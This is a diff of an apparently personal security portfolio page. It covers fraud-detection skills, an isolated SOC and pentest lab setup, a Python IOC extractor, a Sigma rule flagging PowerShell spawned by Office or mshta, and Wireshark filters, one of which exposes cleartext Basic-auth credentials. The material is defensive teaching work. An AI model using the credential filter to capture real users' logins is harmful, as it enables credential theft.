+            <p style="color: var(--text-muted);">Uncovering money laundering networks, multi-accounting behaviors, and family/group-based account pooling using graph analysis and non-transactional digital telemetry.</p>
+          </div>
+          <div class="section-card">
+            <i class="fa-solid fa-sim-card" style="font-size: 1.25rem; color: var(--purple-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Advanced Spoofing & Attacks</h3>
+            <p style="color: var(--text-muted);">Investigating SIM swapping (eSIM/IMSI changes), advanced GPS/location spoofing across iOS and Android channels, and automated card testing attacks.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 2. Fraud Detection Systems -->
+      <div class="space-y">
+        <h2 style="font-size: 1.125rem; margin-bottom: 1rem;">2. Fraud Detection Systems & Rule Engineering</h2>
+        <div class="grid-4" style="font-size: 0.75rem;">
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Custom Rule Development</h3>
+            <p style="color: var(--text-muted);">Building, testing, and implementing complex logic rules combining behavioral metrics, session properties, risk scoring, and device attributes.</p>
+          </div>
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Rule Optimization & Performance Metrics</h3>
+            <p style="color: var(--text-muted);">Measuring rule efficiency using precision metrics (Accuracy, Recall, Probability, Efficiency Score) to minimize false positives while maintaining high detection rates.</p>
+          </div>
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Blocklist & System List Management</h3>
+            <p style="color: var(--text-muted);">Maintaining updated repositories for confirmed mule identities, compromised device IDs, high-risk geohashes, and hosting/VPN subnets based on verified incident data.</p>
+          </div>
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Integration & API Workflow Management</h3>
+            <p style="color: var(--text-muted);">Configuring automated risk event streams (HTTP/Push APIs), debugging API integrations, analyzing log streams, and monitoring operational performance.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 3. Operational Support & Investigation Workflows -->
+      <div class="space-y">
+        <h2 style="font-size: 1.125rem; margin-bottom: 1rem;">3. Operational Support & Investigation Workflows</h2>
+        <div class="grid-3" style="font-size: 0.75rem;">
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">First-Line (L1/L2) Support Orchestration</h3>
+            <p style="color: var(--text-muted);">Establishing decision workflows for call centers and analysts to handle ATO, APP, and mule cases through client verification and session history analysis.</p>
+          </div>
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Incident Classification & Labeling</h3>
+            <p style="color: var(--text-muted);">Categorizing cases into outcomes: <strong>fraud_by_fraudster</strong> (Unauthorized attacks), <strong>fraud_by_client</strong> (Socially engineered payments), <strong>mule_activity</strong> (Money laundering intermediaries), and <strong>false_positive</strong> (Legitimate user anomalies).</p>
+          </div>
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Graph & Entity Connection Analysis</h3>
+            <p style="color: var(--text-muted);">Utilizing graph visualizers to map relationships between user identities, device fingerprints, IP addresses, geohashes, and shared payment corridors to uncover hidden fraud networks.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 4. Data Analysis & Investigative Tools -->
+      <div class="space-y">
+        <h2 style="font-size: 1.125rem; margin-bottom: 1rem;">4. Data Analysis & Investigative Tools</h2>
+        <div class="grid-4" style="font-size: 0.75rem;">
+          <div class="section-card" style="text-align: center;">
+            <i class="fa-brands fa-python" style="font-size: 1.5rem; color: var(--cyan-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Jupyter Notebooks</h3>
+            <p style="color: var(--text-muted); font-size: 0.7rem; margin-top: 0.25rem;">Exploratory data analysis, custom scripting, and notebook modeling.</p>
+          </div>
+          <div class="section-card" style="text-align: center;">
+            <i class="fa-solid fa-magnifying-glass" style="font-size: 1.5rem; color: var(--purple-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">ElasticSearch</h3>
+            <p style="color: var(--text-muted); font-size: 0.7rem; margin-top: 0.25rem;">High-speed log queries and threat hunting across large telemetry sets.</p>
+          </div>
+          <div class="section-card" style="text-align: center;">
+            <i class="fa-solid fa-database" style="font-size: 1.5rem; color: var(--teal-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">ClickHouse</h3>
+            <p style="color: var(--text-muted); font-size: 0.7rem; margin-top: 0.25rem;">High-performance analytics on session events and transaction logs.</p>
+          </div>
+          <div class="section-card" style="text-align: center;">
+            <i class="fa-solid fa-chart-simple" style="font-size: 1.5rem; color: var(--amber-alert); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Grafana</h3>
+            <p style="color: var(--text-muted); font-size: 0.7rem; margin-top: 0.25rem;">Real-time dashboards for monitoring metrics and fraud trends.</p>
           </div>
         </div>
       </div>
@@ -551,27 +595,223 @@
       <div style="margin-bottom: 2rem;">
         <span style="font-size: 0.75rem; font-weight: 700; color: var(--cyan-glow); text-transform: uppercase;">LAB SETUP</span>
         <h1 style="font-size: 2rem; margin-top: 0.25rem;">Virtual Security Lab Architecture & Complete Setup Guide</h1>
-        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Ground-up guide to building an isolated SOC (Defensive) and Pentesting (Offensive) lab environment.</p>
+        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">A comprehensive, ground-up guide to building an isolated, dual-purpose SOC (Defensive) and Pentesting (Offensive) lab environment. From hypervisor deployment to telemetry pipelines and target node configurations.</p>
+        
+        <div style="display: flex; gap: 1rem; margin-top: 1.25rem; flex-wrap: wrap;">
+          <a href="#lab-architecture" class="btn btn-primary">View Architecture <i class="fa-solid fa-arrow-down" style="font-size: 0.75rem;"></i></a>
+          <a href="#setup-guide" class="btn btn-secondary">Explore Setup Steps</a>
+        </div>
       </div>
 
-      <div class="grid-2">
+      <!-- Feature Strip -->
+      <div class="grid-4" style="margin-bottom: 2rem; font-size: 0.75rem;">
+        <div class="section-card" style="padding: 1rem; text-align: center;">
+          <i class="fa-solid fa-flask" style="color: var(--cyan-glow); font-size: 1.25rem; margin-bottom: 0.35rem;"></i>
+          <h3 style="font-size: 0.825rem;">Hands-on Lab</h3>
+          <p style="color: var(--text-muted); font-size: 0.7rem;">Real-world simulations</p>
+        </div>
+        <div class="section-card" style="padding: 1rem; text-align: center;">
+          <i class="fa-solid fa-shield-halved" style="color: var(--purple-glow); font-size: 1.25rem; margin-bottom: 0.35rem;"></i>
+          <h3 style="font-size: 0.825rem;">SOC + Pentest</h3>
+          <p style="color: var(--text-muted); font-size: 0.7rem;">Dual-purpose environment</p>
+        </div>
+        <div class="section-card" style="padding: 1rem; text-align: center;">
+          <i class="fa-solid fa-book" style="color: var(--teal-glow); font-size: 1.25rem; margin-bottom: 0.35rem;"></i>
+          <h3 style="font-size: 0.825rem;">End-to-end Guide</h3>
+          <p style="color: var(--text-muted); font-size: 0.7rem;">From setup to detection</p>
+        </div>
+        <div class="section-card" style="padding: 1rem; text-align: center;">
+          <i class="fa-solid fa-lock" style="color: var(--amber-alert); font-size: 1.25rem; margin-bottom: 0.35rem;"></i>
+          <h3 style="font-size: 0.825rem;">Fully Isolated</h3>
+          <p style="color: var(--text-muted); font-size: 0.7rem;">Safe & controlled testing</p>
+        </div>
+      </div>
+
+      <!-- Lab Architecture & Subnet Table Grid -->
+      <div id="lab-architecture" class="grid-2">
         <div class="section-card">
-          <h2 style="font-size: 1rem; margin-bottom: 1rem;"><i class="fa-solid fa-network-wired" style="color: var(--cyan-glow); margin-right: 0.5rem;"></i>Lab Subnet Mapping</h2>
-          <table style="width: 100%; font-size: 0.75rem; border-collapse: collapse; color: var(--text-muted);">
+          <h2 style="font-size: 1.125rem; margin-bottom: 0.5rem;"><i class="fa-solid fa-sitemap" style="color: var(--cyan-glow); margin-right: 0.5rem;"></i>Lab Network Architecture</h2>
+          <p style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 1rem;">Multi-segmented, isolated environment for safe offensive testing and defensive monitoring.</p>
+          
+          <div style="background-color: var(--bg-surface-alt); padding: 1rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
+            <svg viewBox="0 0 500 220" style="width: 100%; height: auto; font-family: system-ui;">
+              <rect x="200" y="10" width="100" height="30" rx="5" fill="#0b1736" stroke="#38bdf8" stroke-width="1.5"/>
+              <text x="250" y="30" fill="#fff" text-anchor="middle" font-size="10" font-weight="bold">pfSense Router</text>
+
+              <line x1="250" y1="40" x2="90" y2="100" stroke="#38bdf8" stroke-width="1.5" stroke-dasharray="3"/>
+              <line x1="250" y1="40" x2="250" y2="100" stroke="#10b981" stroke-width="1.5"/>
+              <line x1="250" y1="40" x2="410" y2="100" stroke="#ef4444" stroke-width="1.5"/>
+
+              <rect x="20" y="100" width="140" height="70" rx="5" fill="#050c21" stroke="#38bdf8" stroke-width="1"/>
+              <text x="90" y="120" fill="#38bdf8" text-anchor="middle" font-size="10" font-weight="bold">SOC Segment</text>
+              <text x="90" y="140" fill="#94a3b8" text-anchor="middle" font-size="9">10.0.20.0/24</text>
+              <text x="90" y="155" fill="#64748b" text-anchor="middle" font-size="8">SIEM / Suricata IDS</text>
+
+              <rect x="180" y="100" width="140" height="70" rx="5" fill="#050c21" stroke="#10b981" stroke-width="1"/>
+              <text x="250" y="120" fill="#10b981" text-anchor="middle" font-size="10" font-weight="bold">Target Endpoints</text>
+              <text x="250" y="140" fill="#94a3b8" text-anchor="middle" font-size="9">10.0.30.0/24</text>
+              <text x="250" y="155" fill="#64748b" text-anchor="middle" font-size="8">Win AD DC / Win 11 / Linux</text>
+
+              <rect x="340" y="100" width="140" height="70" rx="5" fill="#050c21" stroke="#ef4444" stroke-width="1"/>
+              <text x="410" y="120" fill="#ef4444" text-anchor="middle" font-size="10" font-weight="bold">Attack Segment</text>
+              <text x="410" y="140" fill="#94a3b8" text-anchor="middle" font-size="9">10.0.40.0/24</text>
+              <text x="410" y="155" fill="#64748b" text-anchor="middle" font-size="8">Kali Linux / Commando VM</text>
+            </svg>
+          </div>
+        </div>
+
+        <div class="section-card">
+          <h2 style="font-size: 1.125rem; margin-bottom: 0.5rem;"><i class="fa-solid fa-list-check" style="color: var(--teal-glow); margin-right: 0.5rem;"></i>Lab Subnet Mapping</h2>
+          <table style="width: 100%; font-size: 0.75rem; border-collapse: collapse; color: var(--text-muted); margin-bottom: 1.5rem;">
             <thead>
               <tr style="border-bottom: 1px solid var(--border-color); color: #fff; text-align: left;">
-                <th style="padding: 0.5rem 0;">Segment</th>
-                <th style="padding: 0.5rem 0;">Subnet</th>
+                <th style="padding: 0.5rem 0;">Network Segment</th>
+                <th style="padding: 0.5rem 0;">Subnet / VLAN</th>
                 <th style="padding: 0.5rem 0;">Purpose</th>
               </tr>
             </thead>
             <tbody>
-              <tr style="border-bottom: 1px solid rgba(23, 42, 77, 0.5);"><td style="padding: 0.5rem 0; color: #fff;">WAN / Gateway</td><td class="mono-font">192.168.1.0/24</td><td>Internet Egress</td></tr>
-              <tr style="border-bottom: 1px solid rgba(23, 42, 77, 0.5);"><td style="padding: 0.5rem 0; color: #fff;">Internal SOC</td><td class="mono-font">10.0.20.0/24</td><td>SIEM, Suricata, Logstash</td></tr>
-              <tr style="border-bottom: 1px solid rgba(23, 42, 77, 0.5);"><td style="padding: 0.5rem 0; color: #fff;">Target Endpoints</td><td class="mono-font">10.0.30.0/24</td><td>Windows AD DC, Linux</td></tr>
-              <tr><td style="padding: 0.5rem 0; color: #fff;">Attack Segment</td><td class="mono-font">10.0.40.0/24</td><td>Isolated Kali Node</td></tr>
+              <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td style="padding: 0.5rem 0; color: #fff;">WAN / Gateway</td><td class="mono-font">192.168.1.0/24</td><td>Internet Egress</td></tr>
+              <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td style="padding: 0.5rem 0; color: #fff;">DMZ / Perimeter</td><td class="mono-font">10.0.10.0/24</td><td>Public Services</td></tr>
+              <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td style="padding: 0.5rem 0; color: #fff;">Internal LAN / SOC</td><td class="mono-font">10.0.20.0/24</td><td>Security Operations</td></tr>
+              <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td style="padding: 0.5rem 0; color: #fff;">Target Endpoints</td><td class="mono-font">10.0.30.0/24</td><td>Victim Nodes</td></tr>
+              <tr><td style="padding: 0.5rem 0; color: #fff;">Attack Segment</td><td class="mono-font">10.0.40.0/24</td><td>Isolated Testing</td></tr>
             </tbody>
           </table>
+
+          <h3 style="font-size: 0.875rem; color: #fff; margin-bottom: 0.5rem;">Key Objectives</h3>
+          <ul style="font-size: 0.75rem; color: var(--text-muted); display: flex; flex-direction: column; gap: 0.35rem; list-style: none;">
+            <li>✓ Isolate attack traffic from SOC infrastructure</li>
+            <li>✓ Monitor all target network telemetry</li>
+            <li>✓ Practice real-world detection & response</li>
+            <li>✓ Stay fully offline or controlled egress</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- Step by Step Setup Guide Accordion -->
+      <div id="setup-guide" class="space-y">
+        <h2 style="font-size: 1.25rem; margin-bottom: 1rem;">Step by Step Lab Setup Guide</h2>
+        <div class="section-card" style="margin-bottom: 1rem;">
+          <h3 style="font-size: 1rem; color: var(--cyan-glow);"><span style="background: rgba(56,189,248,0.1); padding: 0.25rem 0.5rem; border-radius: 0.25rem; margin-right: 0.5rem;">01</span>Phase 1: Hypervisor & Virtual Network Core</h3>
+          <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.5rem;">Build the foundation – VMware Workstation Pro, network segmentation, and pfSense firewall routing.</p>
+          <div style="margin-top: 0.75rem; font-size: 0.75rem; color: var(--text-muted);" class="grid-2">
+            <div>
+              <strong style="color: #fff;">VMware Workstation Setup:</strong>
+              <ul style="margin-top: 0.25rem; margin-left: 1rem;">
+                <li>Install VMware Workstation Pro</li>
+                <li>Configure VMnet0, VMnet1, VMnet2, VMnet3</li>
+                <li>Disable VMware DHCP for isolated segments</li>
+              </ul>
+            </div>
+            <div>
+              <strong style="color: #fff;">pfSense Interfaces:</strong>
+              <ul style="margin-top: 0.25rem; margin-left: 1rem;" class="mono-font">
+                <li>em0 -> WAN (DHCP)</li>
+                <li>em1 -> LAN (10.0.20.1/24)</li>
+                <li>em2 -> OPT1 (10.0.30.1/24)</li>
+                <li>em3 -> OPT2 (10.0.40.1/24)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-card" style="margin-bottom: 1rem;">
+          <h3 style="font-size: 1rem; color: var(--cyan-glow);"><span style="background: rgba(56,189,248,0.1); padding: 0.25rem 0.5rem; border-radius: 0.25rem; margin-right: 0.5rem;">02</span>Phase 2: Defensive Telemetry & SOC Infrastructure</h3>
+          <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.5rem;">Deploy Suricata IDS, Elastic/Wazuh SIEM, and configure log ingestion pipelines.</p>
+        </div>
+
+        <div class="section-card" style="margin-bottom: 1rem;">
+          <h3 style="font-size: 1rem; color: var(--cyan-glow);"><span style="background: rgba(56,189,248,0.1); padding: 0.25rem 0.5rem; border-radius: 0.25rem; margin-right: 0.5rem;">03</span>Phase 3: Monitored Target Endpoints</h3>
+          <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.5rem;">Setup Windows AD/Windows 11 and Linux endpoints with Sysmon, Auditd, and agent shipping.</p>
+        </div>
+
+        <div class="section-card">
+          <h3 style="font-size: 1rem; color: var(--cyan-glow);"><span style="background: rgba(56,189,248,0.1); padding: 0.25rem 0.5rem; border-radius: 0.25rem; margin-right: 0.5rem;">04</span>Phase 4: Isolated Offensive Testing Node</h3>
+          <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.5rem;">Deploy Kali Linux and validate attacks to verify end-to-end detection.</p>
+        </div>
+      </div>
+
+      <!-- Lab Stack & Key Components -->
+      <div class="space-y">
+        <h2 style="font-size: 1.25rem; margin-bottom: 1rem;">Lab Stack & Key Components</h2>
+        <div class="grid-4" style="font-size: 0.75rem;">
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-solid fa-desktop" style="font-size: 1.5rem; color: var(--cyan-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">VMware Workstation Pro</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Virtualization platform for multi-segment lab deployment</p>
+          </div>
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-solid fa-shield-halved" style="font-size: 1.5rem; color: var(--purple-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">pfSense</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Network routing, segmentation, and traffic control</p>
+          </div>
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-solid fa-layer-group" style="font-size: 1.5rem; color: var(--teal-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Elastic Stack</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Centralized log collection, search, and visualization</p>
+          </div>
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-solid fa-eye" style="font-size: 1.5rem; color: var(--amber-alert); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Wazuh</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Open-source SIEM/XDR for threat detection and monitoring</p>
+          </div>
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-solid fa-wave-square" style="font-size: 1.5rem; color: var(--cyan-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Suricata</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Network intrusion detection and traffic analysis</p>
+          </div>
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-brands fa-windows" style="font-size: 1.5rem; color: var(--purple-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Sysmon</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Deep Windows process and event monitoring</p>
+          </div>
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-solid fa-box" style="font-size: 1.5rem; color: var(--teal-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Filebeat / Winlogbeat</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Log shipping to SIEM backend</p>
+          </div>
+          <div class="section-card" style="padding: 1rem; text-align: center;">
+            <i class="fa-solid fa-terminal" style="font-size: 1.5rem; color: var(--amber-alert); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem;">Kali Linux</h3>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.25rem;">Offensive security testing and attack simulation</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Downloadable Configurations -->
+      <div class="space-y">
+        <h2 style="font-size: 1.25rem; margin-bottom: 0.5rem;">Downloadable Configurations</h2>
+        <p style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 1rem;">Ready-to-use configuration files for quick setup.</p>
+        <div class="grid-4" style="font-size: 0.75rem;">
+          <div class="section-card" style="padding: 1rem; display: flex; justify-content: space-between; align-items: center;">
+            <div>
+              <strong style="color: #fff;" class="mono-font">sysmonconfig.xml</strong>
+              <div style="font-size: 0.65rem; color: var(--text-muted);">Windows Endpoint</div>
+            </div>
+            <i class="fa-solid fa-download" style="color: var(--cyan-glow); cursor: pointer;"></i>
+          </div>
+          <div class="section-card" style="padding: 1rem; display: flex; justify-content: space-between; align-items: center;">
+            <div>
+              <strong style="color: #fff;" class="mono-font">suricata.yaml</strong>
+              <div style="font-size: 0.65rem; color: var(--text-muted);">Network IDS</div>
+            </div>
+            <i class="fa-solid fa-download" style="color: var(--cyan-glow); cursor: pointer;"></i>
+          </div>
+          <div class="section-card" style="padding: 1rem; display: flex; justify-content: space-between; align-items: center;">
+            <div>
+              <strong style="color: #fff;" class="mono-font">audit.rules</strong>
+              <div style="font-size: 0.65rem; color: var(--text-muted);">Linux Endpoint</div>
+            </div>
+            <i class="fa-solid fa-download" style="color: var(--cyan-glow); cursor: pointer;"></i>
+          </div>
+          <div class="section-card" style="padding: 1rem; display: flex; justify-content: space-between; align-items: center;">
+            <div>
+              <strong style="color: #fff;" class="mono-font">filebeat.yml</strong>
+              <div style="font-size: 0.65rem; color: var(--text-muted);">Log Shipping</div>
+            </div>
+            <i class="fa-solid fa-download" style="color: var(--cyan-glow); cursor: pointer;"></i>
+          </div>
         </div>
       </div>
     </section>
@@ -581,29 +821,161 @@
       <div style="margin-bottom: 2rem;">
         <span style="font-size: 0.75rem; font-weight: 700; color: var(--cyan-glow); text-transform: uppercase;">TOOLS</span>
         <h1 style="font-size: 2rem; margin-top: 0.25rem;">Tactical Security Tools & Quick References</h1>
-        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Custom log parsers, detection rules (Sigma/YARA), and operational cheat sheets.</p>
+        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">A collection of custom log parsers, detection rules (Sigma/YARA), and operational cheat sheets built for threat hunting, telemetry analysis, and incident response.</p>
       </div>
 
+      <!-- 3 Category Cards -->
+      <div class="grid-3" style="font-size: 0.75rem; margin-bottom: 2rem;">
+        <div class="section-card">
+          <i class="fa-solid fa-terminal" style="font-size: 1.25rem; color: var(--cyan-glow); margin-bottom: 0.5rem;"></i>
+          <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">1. Custom Utility Scripts</h3>
+          <p style="color: var(--text-muted); margin-bottom: 0.75rem;">Python and Bash automation scripts for parsing raw log formats, extracting IOCs, and enriching telemetry against threat feeds.</p>
+          <strong style="color: #fff;">Featured Utilities:</strong>
+          <ul style="color: var(--text-muted); margin-top: 0.25rem; list-style: none;">
+            <li>✓ Log field extractors</li>
+            <li>✓ PCAP header parsers</li>
+            <li>✓ Automated geohash / IP lookup tools</li>
+          </ul>
+        </div>
+
+        <div class="section-card">
+          <i class="fa-solid fa-shield-cat" style="font-size: 1.25rem; color: var(--purple-glow); margin-bottom: 0.5rem;"></i>
+          <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">2. Detection Rule Sets</h3>
+          <p style="color: var(--text-muted); margin-bottom: 0.75rem;">Pre-compiled YARA and Sigma rules for identifying adversary techniques across Windows Event Logs, Linux Auditd, and WAF traffic.</p>
+          <strong style="color: #fff;">Featured Rules:</strong>
+          <ul style="color: var(--text-muted); margin-top: 0.25rem; list-style: none;">
+            <li>✓ Unsigned process execution</li>
+            <li>✓ Obfuscated command-line detection</li>
+            <li>✓ Credential stuffing behavioral signatures</li>
+          </ul>
+        </div>
+
+        <div class="section-card">
+          <i class="fa-solid fa-book-bookmark" style="font-size: 1.25rem; color: var(--teal-glow); margin-bottom: 0.5rem;"></i>
+          <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">3. Operational Cheatsheets</h3>
+          <p style="color: var(--text-muted); margin-bottom: 0.75rem;">High-value reference guides for day-to-day SOC triage, network packet analysis, and forensic artifact locations.</p>
+          <strong style="color: #fff;">Featured References:</strong>
+          <ul style="color: var(--text-muted); margin-top: 0.25rem; list-style: none;">
+            <li>✓ Essential Windows Event IDs</li>
+            <li>✓ Wireshark display filters</li>
+            <li>✓ tshark command-line syntax</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- Code Snippets Grid -->
       <div class="grid-2">
         <div class="section-card">
           <div class="flex-between" style="margin-bottom: 0.75rem;">
-            <h3 style="font-size: 0.875rem;">Tool 1: Log Parser & IOC Extractor</h3>
+            <h3 style="font-size: 0.875rem;">Tool 1: Log Parser & IOC Extractor (<span class="mono-font">log_parser.py</span>)</h3>
             <button onclick="copySnippet(this)" class="btn btn-primary" style="padding: 0.25rem 0.5rem; font-size: 0.65rem;">Copy Code</button>
           </div>
           <div class="code-container">
             <pre><code>import re
+import sys
 
 IP_PATTERN = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
 
-def extract_iocs(log_path):
+def extract_iocs(log_file_path):
     unique_ips = set()
-    with open(log_path, 'r') as f:
-        for line in f:
-            for ip in re.findall(IP_PATTERN, line):
-                unique_ips.add(ip)
-    print(f"[+] Extracted {len(unique_ips)} IPs:")
-    for ip in sorted(unique_ips):
-        print(ip)</code></pre>
+    try:
+        with open(log_file_path, 'r') as file:
+            for line in file:
+                ips = re.findall(IP_PATTERN, line)
+                for ip in ips:
+                    unique_ips.add(ip)
+        
+        print(f"[+] Extracted {len(unique_ips)} unique IP addresses:\n")
+        for ip in sorted(unique_ips):
+            print(ip)
+            
+    except FileNotFoundError:
+        print(f"[-] Error: File '{log_file_path}' not found.")
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        extract_iocs(sys.argv[1])
+    else:
+        print("Usage: python3 log_parser.py <path_to_log_file>")</code></pre>
+          </div>
+        </div>
+
+        <div class="section-card">
+          <div class="flex-between" style="margin-bottom: 0.75rem;">
+            <h3 style="font-size: 0.875rem;">Tool 2: Sigma Rule — Suspicious PowerShell Parent Process</h3>
+            <button onclick="copySnippet(this)" class="btn btn-primary" style="padding: 0.25rem 0.5rem; font-size: 0.65rem;">Copy Code</button>
+          </div>
+          <div class="code-container">
+            <pre><code>title: Suspicious PowerShell Child Process Execution
+id: f38a29a1-7e82-4c22-b98a-112233445566
+status: experimental
+description: Detects powershell.exe spawned by unexpected parent processes.
+author: Privacy Skill Vault
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        ParentImage|endswith:
+            - '\winword.exe'
+            - '\excel.exe'
+            - '\mshta.exe'
+            - '\wmiprvse.exe'
+    condition: selection
+falsepositives:
+    - Custom administrative automation scripts
+level: high
+tags:
+    - attack.execution
+    - attack.t1059.001</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- Quick Reference Cheatsheets Tables -->
+      <div class="space-y">
+        <h2 style="font-size: 1.25rem; margin-bottom: 1rem;">Quick Reference Cheatsheets</h2>
+        <div class="grid-2" style="font-size: 0.75rem;">
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.75rem; color: var(--cyan-glow);">Cheat Sheet A: Essential Windows Event IDs for SOC Analysts</h3>
+            <table style="width: 100%; border-collapse: collapse; text-align: left; color: var(--text-muted);">
+              <thead>
+                <tr style="border-bottom: 1px solid var(--border-color); color: #fff;">
+                  <th style="padding: 0.35rem 0;">Event ID</th>
+                  <th style="padding: 0.35rem 0;">Source</th>
+                  <th style="padding: 0.35rem 0;">Description</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td class="mono-font" style="color: #fff;">4624</td><td>Security</td><td>Successful Logon (Type 3 Network, 10 RDP)</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td class="mono-font" style="color: #fff;">4625</td><td>Security</td><td>Failed Logon Attempt (Brute-force indicator)</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td class="mono-font" style="color: #fff;">4688</td><td>Security</td><td>New Process Created (Inspect command line)</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td class="mono-font" style="color: #fff;">4720</td><td>Security</td><td>A user account was created</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td class="mono-font" style="color: #fff;">4104</td><td>PowerShell</td><td>Script Block Logging (Raw script code)</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td class="mono-font" style="color: #fff;">1</td><td>Sysmon</td><td>Process Creation (Hashes, Parent Command)</td></tr>
+                <tr><td class="mono-font" style="color: #fff;">3</td><td>Sysmon</td><td>Network Connection (Process ID to Dest IP)</td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.75rem; color: var(--cyan-glow);">Cheat Sheet B: High-Value Wireshark / TShark Filters</h3>
+            <table style="width: 100%; border-collapse: collapse; text-align: left; color: var(--text-muted);">
+              <thead>
+                <tr style="border-bottom: 1px solid var(--border-color); color: #fff;">
+                  <th style="padding: 0.35rem 0;">Analysis Objective</th>
+                  <th style="padding: 0.35rem 0;">Wireshark Display Filter</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td>HTTP POST Data</td><td class="mono-font" style="color: var(--cyan-glow);">http.request.method == "POST"</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td>DNS Queries</td><td class="mono-font" style="color: var(--cyan-glow);">dns.flags.response == 0 and dns.qry.name contains "xyz"</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td>SYN Flood / Port Scan</td><td class="mono-font" style="color: var(--cyan-glow);">tcp.flags.syn == 1 and tcp.flags.ack == 0</td></tr>
+                <tr style="border-bottom: 1px solid rgba(22, 43, 84, 0.5);"><td>Cleartext Credentials</td><td class="mono-font" style="color: var(--cyan-glow);">http.authorization contains "Basic"</td></tr>
+                <tr><td>TLS Client Hello</td><td class="mono-font" style="color: var(--cyan-glow);">tls.handshake.type == 1</td></tr>
+              </tbody>
+            </table>
           </div>
         </div>
       </div>
